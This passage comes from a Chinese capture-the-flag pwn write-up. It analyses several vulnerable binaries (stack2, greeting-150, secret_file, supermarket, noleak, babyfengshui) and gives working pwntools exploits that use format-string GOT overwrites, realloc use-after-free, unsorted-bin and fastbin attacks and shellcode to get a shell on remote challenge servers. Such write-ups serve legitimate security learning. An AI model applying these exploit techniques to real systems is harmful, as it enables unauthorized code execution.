class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;numbers\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x84</span>,<span class="number">0X9B</span>)</span><br><span class="line">add(<span class="number">0x84</span>+<span class="number">1</span>,<span class="number">0X85</span>)</span><br><span class="line">add(<span class="number">0x84</span>+<span class="number">2</span>,<span class="number">0X04</span>)</span><br><span class="line">add(<span class="number">0x84</span>+<span class="number">3</span>,<span class="number">0X08</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果发现远程靶机上没有bash，所以无法使用程序中给的后门得到shell，需要构造ROP进行system(‘sh’)</p>
<p>那么首先找到system的plt和”sh“的地址。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108223451146.png" alt="image-20210108223451146"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108223658424.png" alt="image-20210108223658424"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./stack2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>,<span class="number">45323</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,num</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;which number to change:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;new number:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;you have:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;numbers\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x84</span>,<span class="number">0X50</span>)</span><br><span class="line">add(<span class="number">0x84</span>+<span class="number">1</span>,<span class="number">0X84</span>)</span><br><span class="line">add(<span class="number">0x84</span>+<span class="number">2</span>,<span class="number">0X04</span>)</span><br><span class="line">add(<span class="number">0x84</span>+<span class="number">3</span>,<span class="number">0X08</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x84</span>+<span class="number">8</span>,<span class="number">0X87</span>)</span><br><span class="line">add(<span class="number">0x84</span>+<span class="number">8</span>+<span class="number">1</span>,<span class="number">0X89</span>)</span><br><span class="line">add(<span class="number">0x84</span>+<span class="number">8</span>+<span class="number">2</span>,<span class="number">0X04</span>)</span><br><span class="line">add(<span class="number">0x84</span>+<span class="number">8</span>+<span class="number">3</span>,<span class="number">0X08</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108223824540.png" alt="image-20210108223824540"></p>
<h3 id="16-greeting-150"><a href="#16-greeting-150" class="headerlink" title="16. greeting-150"></a>16. greeting-150</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125094546610.png" alt="image-20201125094546610"></p>
<p>首先checksec</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201204833485.png" alt="image-20201201204833485"></p>
<h4 id="代码分析-12"><a href="#代码分析-12" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201205229762.png" alt="image-20201201205229762"></p>
<p>sprintf函数的作用是，将v5的内容按照format拼接到“Nice to meet you,%s：）”中。之后的返回值调用printf函数，显然这里存在的是格式化字符串漏洞。</p>
<h4 id="思路及利用-12"><a href="#思路及利用-12" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>要利用这个格式化字符串漏洞，首先需要找到字符串的偏移。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209085535031.png" alt="image-20201209085535031"></p>
<p>可以看出输如的aaaa并没有在一个偏移内，需要填充两个字符。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209085719874.png" alt="image-20201209085719874"></p>
<p>对于aaaa来说，偏移是12.知道偏移后，就可以用格式化字符串漏洞做到任意地址的读写。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209090009791.png" alt="image-20201209090009791"></p>
<p>注意到程序中有调用system函数，那么只需要修改某个got为system函数的plt就可以调用system函数了。</p>
<p>考虑到传参的问题，这个被修改的got最好能获得输入。于是在输入函数中发现strlen函数比较适合。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209090448566.png" alt="image-20201209090448566"></p>
<p>只要修改strlen函数的got为system的plt，再想办法返回main重新输入”/bin/sh”就可以得到shell了。</p>
<p>接下来就是如何返回main的问题。</p>
<p><code>.fini_array</code> 节存放了指向终止代码的函数指针，在main函数调用后被触发。所以把.fini_array[0]改为mian的地址即可。</p>
<p>在ida中使用快捷键ctrl+s可以看到fini_array的地址。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209091546640.png" alt="image-20201209091546640"></p>
<p>同时也可以得到如下地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fini_got &#x3D; 0x8049934  </span><br><span class="line">main_addr &#x3D; 0x80485ED  </span><br><span class="line">strlen_got &#x3D; 0x8049A54  </span><br><span class="line">system_plt &#x3D; 0x8048490 </span><br></pre></td></tr></table></figure>

<p>由于可输入的只有64字节。格式化字符串需要设计一下。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209092156695.png" alt="image-20201209092156695"></p>
<p>可以看到，fini_array的内容的地址与main只有两个字节不一样。只需要修改后两个字节，用到格式化字符<code>%hn</code>.</p>
<p>strlen的GOT表内容，四个字节我们都需要修改，我们拆分为2个2字节写。因此，我们一共需要写三个：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arr &#x3D; [  </span><br><span class="line">   0x85ED,  </span><br><span class="line">   0x8490,0x804  </span><br><span class="line">]  </span><br></pre></td></tr></table></figure>

<p>由于是小端序，因此，我们要在fini_got写入2字节数据arr[0]；在strlen_got写入2字节数据arr[2]，在strlen_got+2处写入2字节数据arr[1]。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./greeting-150&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;220.249.52.133&#x27;,38405)</span></span><br><span class="line">strlen_got = <span class="number">0x8049A54</span></span><br><span class="line">system_got = <span class="number">0x8049A48</span></span><br><span class="line">main_addr = <span class="number">0x80485ED</span>  </span><br><span class="line">init_array = <span class="number">0x8049934</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;aa&#x27;</span></span><br><span class="line">payload += p32(strlen_got)</span><br><span class="line">payload += p32(strlen_got+<span class="number">2</span>)</span><br><span class="line">payload += p32(init_array)</span><br><span class="line">arr = [  </span><br><span class="line">   <span class="number">0x85ED</span>,  </span><br><span class="line">   <span class="number">0x8490</span>,</span><br><span class="line">   <span class="number">0x804</span>  </span><br><span class="line">]</span><br><span class="line">num = arr[<span class="number">2</span>] - <span class="number">32</span>  </span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(num) + <span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">num = arr[<span class="number">1</span>] - arr[<span class="number">2</span>]  </span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(num) + <span class="string">&#x27;c%12$hn&#x27;</span></span><br><span class="line">num = arr[<span class="number">0</span>] - arr[<span class="number">1</span>]  </span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(num) + <span class="string">&#x27;c%14$hn&#x27;</span>  </span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">len</span>(payload)  )</span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>最终结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125094520178.png" alt="image-20201125094520178"></p>
<h3 id="17-secret-file"><a href="#17-secret-file" class="headerlink" title="17. secret_file"></a>17. secret_file</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109151917873.png" alt="image-20210109151917873"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109151947667.png" alt="image-20210109151947667"></p>
<h4 id="代码分析-13"><a href="#代码分析-13" class="headerlink" title="代码分析"></a>代码分析</h4><p>程序的基本逻辑是获取一个输入，经过SHA256后于一个v15一个提前写好的哈希值比较,如果通过，就执行<code>v9 = popen((const char *)&amp;v14, &quot;r&quot;);</code></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109153111330.png" alt="image-20210109153111330"></p>
<p>v9调试发现是</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109153334937.png" alt="image-20210109153334937"></p>
<p>这不是我们需要的命令，需要自己输入。然后观察输入函数与几个参数的位置关系。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109153724043.png" alt="image-20210109153724043"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109153932567.png" alt="image-20210109153932567"></p>
<p>使用getline作为输入函数，那么可以任意溢出。</p>
<h4 id="思路及利用-13"><a href="#思路及利用-13" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>v14为输入的命令值，可以通过dest溢出覆盖，然后接着将v15是存储的hash值可以覆盖为我们输入的前0x100的字符的hash值，这样就可以通过检测。</p>
<p>编写exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment">#p = process(&#x27;./secret_file&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>, <span class="number">46791</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="string">&quot;a&quot;</span>*<span class="number">0x100</span></span><br><span class="line">payload  = padding + <span class="string">&#x27;cat flag.txt;&#x27;</span>.ljust(<span class="number">0x1B</span>,<span class="string">&#x27; &#x27;</span>) + hashlib.sha256(padding.encode()).hexdigest()  </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109154835772.png" alt="image-20210109154835772"></p>
<h2 id="五分题"><a href="#五分题" class="headerlink" title="五分题"></a>五分题</h2><h3 id="18-supermarket"><a href="#18-supermarket" class="headerlink" title="18. supermarket"></a>18. supermarket</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201221100516746.png" alt="image-20201221100516746"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201221100534999.png" alt="image-20201221100534999"></p>
<h4 id="代码分析-14"><a href="#代码分析-14" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222171344578.png" alt="image-20201222171344578"></p>
<p>程序实现了商品的添加、删除、查询、更改。其中商品又名称、价格、描述，可以修改价格和描述。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222172654517.png" alt="image-20201222172654517"></p>
<p>程序所用堆的结构大致为：其中，description的chunk大小是可以被我们控制的。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222172643751.png" alt="image-20201222172643751"></p>
<p>漏洞出现在修改描述上。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222171556274.png" alt="image-20201222171556274"></p>
<p>realloc函数作用大概如下：</p>
<p>1）如果当前内存段后面有需要的内存空间，则直接扩展这段内存空间，realloc()将返回原指针。<br>2）如果当前内存段后面的空闲字节不够，那么就使用堆中的第一个能够满足这一要求的内存块，将目前的数据复制到新的位置，并将原来的数据块释放掉，返回新的内存块位置。<br>3）如果申请失败，将返回NULL，此时，原来的指针仍然有效。</p>
<p>也就是说，如果在修改描述时申请的空间比之前大，原来的会被free掉，但是这里没有把新的地址赋给指向描述的指针，存在UAF漏洞。</p>
<h4 id="思路及利用-14"><a href="#思路及利用-14" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>保护并没有限制修改got表，而且程序也提供了输出函数。那么大致的思路就是，先泄露got地址，确定真实地址、libc版本，找到system函数地址，修改got表项为system，输入“/bin/sh”获得shell，这里选择atoi比较方便。</p>
<p>接下来就是如何实现的问题：</p>
<ul>
<li>先申请一个description大于fastbin大小的chunk（0x80）的商品0.</li>
<li>再申请一个较小的商品1（用来分隔，如果不用商品1来分隔，则realoc直接扩展商品0的descript的大小至新size）。</li>
<li>修改商品0的描述，大小改为0x90.出发realoc函数。</li>
<li>申请商品2，描述大小为0x80.这样商品2首先申请结构体就是商品0的描述。（商品的结构体为0x1c）</li>
<li>这样修改商品0的描述就是修改商品2，首先将商品2的<code>*description</code>改为atoi的got地址，输出。</li>
<li>获得system地址，修改商品2的描述就是修改atoi的got表项。</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222175100455.png" alt="image-20201222175100455"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./supermarket&#x27;)  </span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">48203</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./supermarket&#x27;</span>)  </span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">index,size,content</span>):</span>  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;price:&#x27;</span>,<span class="string">&#x27;10&#x27;</span>)  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;descrip_size:&#x27;</span>,<span class="built_in">str</span>(size))  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;description:&#x27;</span>,content)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span>  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span>  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,content</span>):</span>  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;descrip_size:&#x27;</span>,<span class="built_in">str</span>(size))  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;description:&#x27;</span>,content) </span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x10</span>)  </span><br><span class="line"><span class="comment">#注意不要加任何数据，因为我们发送的数据写入到的是一个被free的块</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x20</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">0x10</span>) </span><br><span class="line"><span class="comment">#修改商品0的描述，就是修改商品2，这里需要保留商品2的名称、描述大小</span></span><br><span class="line">payload = <span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p32(<span class="number">20</span>) + p32(<span class="number">0x20</span>) + p32(atoi_got)  </span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"><span class="comment">#泄露地址</span></span><br><span class="line">show()  </span><br><span class="line">p.recvuntil(<span class="string">&#x27;2: price.20, des.&#x27;</span>)  </span><br><span class="line"><span class="comment"># print(p.recv())</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">atoi_addr = u32(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">b&#x27;\n&#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))  </span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr)  </span><br><span class="line">libc_base = atoi_addr - libc.dump(<span class="string">&#x27;atoi&#x27;</span>)  </span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)  </span><br><span class="line"><span class="comment">#修改atoi的表，将它指向system  </span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x20</span>,p32(system_addr))  </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.interactive()  </span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222182139072.png" alt="image-20201222182139072"></p>
<h3 id="19-noleak"><a href="#19-noleak" class="headerlink" title="19. noleak"></a>19. noleak</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201221093630034.png" alt="image-20201221093630034"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201221093644804.png" alt="image-20201221093644804"></p>
<h4 id="代码分析-15"><a href="#代码分析-15" class="headerlink" title="代码分析"></a>代码分析</h4><p>首先，附件已经提示，<strong>程序是在glibc 2.23下的。</strong></p>
<p>程序是一个自定义的堆管理，实现了添加、删除和更新功能。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222162245601.png" alt="image-20201222162245601"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222162413637.png" alt="image-20201222162413637"></p>
<p>其中漏洞出现再删除和更新上，如图注释所示。由于删除没有置null，存在UAF漏洞，更新存在堆溢出漏洞。</p>
<h4 id="思路及利用-15"><a href="#思路及利用-15" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>由于为<code> Full RELRO</code>，不能更改got表。</p>
<p>整个程序没有输出的选项，也就无法泄露地址（noleak）</p>
<p>而存在UAF漏洞，是可以做到任意地址写的，所以考虑是修改hook函数，将<strong>__malloc_hook</strong>函数修改，这样调用malloc时就会调用 malloc_hook里的指针。</p>
<p>想要修改malloc_hook我们就想到了unsortedbin attack。因为一般来讲，malloc_hook与unsordtedbin相隔不远。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222202509095.png" alt="image-20201222202509095"></p>
<p>程序通过一个在bss段的全局数组管理堆，目标就是通过unsortedbin attack将__malloc_hook的地址写入到这个全局数组上。</p>
<p>为了达成这一目标，首先要是使用unsortedbin attack将unsortedbin的地址写入bss段，然后将最后的俩位从78改为10.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0x80</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">new(<span class="number">0x20</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unsortedbin attack</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x601060</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222205731171.png" alt="image-20201222205731171"></p>
<p>程序并没有开启堆栈不可知性，可以将shellcode写入bss段，然后就是将__malloc_hook里的指针指向写入的shellcoed就可以得到shell。</p>
<p>接下来就是考虑如何修改的问题，由于之前使用了unsortedbin attack，破坏了unsortedbin的结构，因此这里使用fastbinattack，申请chunk即在全局数组，然后通过修改数组的值，借助update函数，将78改为10。</p>
<p>而使用fastbinattack，需要绕过size检查，可以借助写入的7f，这里需要计算一下偏移让伪造的size位为7f。也就是从0x60106d开始。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">update(<span class="number">1</span>, <span class="number">8</span>, p64(<span class="number">0x60106d</span>))</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222211533132.png" alt="image-20201222211533132"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222211642972.png" alt="image-20201222211642972"></p>
<p>然后就是申请0x60大小的chunk，之后我们在数组索引为8，9的位置分别写入了存储泄露出的地址的<code>0x601070</code>和指针数组的开头<code>0x601040</code>，方便我们接下来写入shellcode.</p>
<p><code>new(0x60,b&#39;\x00&#39;*3+p64(0x601070)+p64(0x601040))</code><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222212109392.png" alt="image-20201222212109392"></p>
<p>这样就可以通过修改数组8，改78为10，然后修改数组6（0x601070）为输入的shellcode（数组开端），通过修改数组9，将shellcode写入bss段（从0x601040开始）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">update(<span class="number">8</span>, <span class="number">1</span>, <span class="string">b&#x27;\x10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">6</span>, <span class="number">8</span>, p64(<span class="number">0x601040</span>))</span><br><span class="line">update(<span class="number">9</span>, <span class="number">256</span>, asm(shellcraft.amd64.sh()))</span><br></pre></td></tr></table></figure>

<p>最后调用malloc就可以得到shell。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222212557359.png" alt="image-20201222212557359"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./timu&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node3.buuoj.cn&quot;,28605)</span></span><br><span class="line"><span class="comment"># p = remote(&quot;220.249.52.134&quot;,58955)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size, data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Data&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">idx, size, data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Data&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">new(<span class="number">0x20</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x601060</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">update(<span class="number">1</span>, <span class="number">8</span>, p64(<span class="number">0x60106d</span>))</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">3</span>+p64(<span class="number">0x601070</span>)+p64(<span class="number">0x601040</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">update(<span class="number">8</span>, <span class="number">1</span>, <span class="string">b&#x27;\x10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">6</span>, <span class="number">8</span>, p64(<span class="number">0x601040</span>))</span><br><span class="line">update(<span class="number">9</span>, <span class="number">256</span>, asm(shellcraft.amd64.sh()))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Size&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="20-babyfengshui"><a href="#20-babyfengshui" class="headerlink" title="20. babyfengshui"></a>20. babyfengshui</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222220954444.png" alt="image-20201222220954444"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222221013962.png" alt="image-20201222221013962"></p>
<h4 id="代码分析-16"><a href="#代码分析-16" class="headerlink" title="代码分析"></a>代码分析</h4><p>程序实现了添加新用户、删除、更改等操作。</p>
<p>其结构如图所示：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222222940532.png" alt="image-20201222222940532"></p>
<p>一般来讲，申请的chunk是相邻的。</p>
<p>漏洞出现在更改上。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222221324550.png" alt="image-20201222221324550"></p>
<p>这里是一个检查溢出的判断，可以从结构图就可以看出，这种溢出检验是基于两个chunk是紧邻的。如果一个用户的两个chunk不相邻，且desc在node的前面，就可以做到溢出。</p>
<h4 id="思路及利用-16"><a href="#思路及利用-16" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>接下的问题就是如何将一个用户的两个chunk分开。</p>
<p>先申请三个一样大小（0x80）的用户，删除用户0，unlink会有一个0x100的空闲块，再申请用户3，大小0x100，就将用户3的node与desc分开。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222223555039.png" alt="image-20201222223555039"></p>
<p>然后使用溢出，修改用户1node的description指针为free的got，先泄露地址，再修改为system。最后调用free，得到shell。这里将用户2的description写为“/bin/sh\x00”</p>
<p>exp：</p>
